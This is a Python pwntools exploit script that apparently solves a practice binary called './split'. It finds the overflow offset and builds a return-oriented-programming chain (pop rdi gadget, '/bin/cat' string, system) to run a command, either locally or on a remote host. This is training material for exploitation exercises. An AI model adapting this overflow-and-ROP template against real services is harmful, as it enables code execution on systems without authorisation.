from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './split'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

offset = find_ip(cyclic(100))


# Start program
io = start()

# Locate the functions/strings we need
pop_rdi_gadget = ROP(elf).find_gadget(["pop rdi", "ret"])[0]
# ropper -f split --search "pop rdi; ret;"
# pop_rdi_gadget = 0x4007c3

bincat_addr = next(elf.search(b'/bin/cat'))
system_addr = elf.symbols['system']

# Print out the target address
info("%#x pop rdi; ret;", pop_rdi_gadget)
info("%#x /bin/cat", bincat_addr)
info("%#x system", system_addr)

# Build the payload
payload = flat({
    offset: [pop_rdi_gadget,
		    bincat_addr,
		    system_addr]
})

# Send the payload
io.sendlineafter('>', payload)
io.recvuntil('Thank you!\n')
print(io.recvall())
